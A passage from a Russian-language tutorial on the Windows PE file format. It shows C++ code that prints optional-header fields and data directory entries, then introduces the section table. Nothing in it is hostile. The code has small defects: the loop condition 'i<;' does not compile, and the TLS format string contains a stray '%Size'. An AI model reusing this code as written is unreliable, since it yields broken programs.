&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MajorSubsystemVersion</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">MinorSubsystemVersion</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">Win32VersionValue</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfImage</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfHeaders</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">CheckSum</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">Subsystem</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DllCharacteristics</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfStackReserve</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfStackCommit</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfHeapReserve</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SizeOfHeapCommit</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">LoaderFlags</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">NumberOfRvaAndSizes</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h3><a name="c28"></a>Работа с таблицей директорий</h3>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printDataDirectory<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span>static_cast<span style="color: #339933;">&lt;</span><span style="color: #993333;">struct</span> _IMAGE_NT_HEADERS<span style="color: #339933;">*&gt;</span>NTSIGNATURE<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_DATA_DIRECTORY &nbsp; DataDirectory<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_DATA_DIRECTORY<span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: black;">&#40;</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;;</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">NumberOfRvaAndSizes</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">switch</span> <span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_EXPORT<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Export Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_IMPORT<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Import Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_RESOURCE<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Resource Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Exception Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_SECURITY<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Security Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_BASERELOC<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Basereloc Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_DEBUG<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Debug Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Architecture Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---GlobalPTR Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_TLS<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---TLS Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>%Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---LOADCONFIG Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Bound-Import Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_IAT<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---IAT Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Delay-Import Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;---Com Descriptor Directory---<span style="color: #000099; font-weight: bold;">\n</span>RVA: %X<span style="color: #000099; font-weight: bold;">\n</span>Size: %X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">,</span>DataDirectory<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h3><a name="c29"></a>Таблица секций</h3>
<p>Таблица секций - это база данных, для всех секций используемых в PE-файле. Сразу после окончания опционального заголовка следует таблица секций. В PE-файле теоретически может быть сколько угодно секций. Все они могут иметь одинаковые атрибуты и даже одинаковые имена(!), кроме секции ресурсов :). Но обычно секции делят либо по их логическому предназначению, либо по атрибутам. Имена секций вообще никого не волнуют и нигде не проверяются (почти). Загрузчик ориентируется на массив DataDirectory в опциональном заголовке, для того чтобы найти нужные данные. Это сделано в целях оптимизации, чтобы не сравнивать строки, а просто перейти сразу же к нужной директории с помощью соответствующих индексов. Но некоторые особо "талантливые- программисты все равно используют имя секции, так что будьте с этим аккуратнее. В приложениях Windows NT могут использоваться много стандартных секций - .text(.CODE) - код программы, .bss - для неинициализированных данных, .rdata - данные только для чтения, .data - глобальные переменные, .rsrc - ресурсы, .edata - экспорт, .idata - импорт, .debug - отладочная информация и т.д. Такие секции создают линкеры, опираясь на спецификацию Microsoft. Таблица секций это массив элементов типа IMAGE_SECTION_HEADER. Этот тип определен следующим образом:</p>
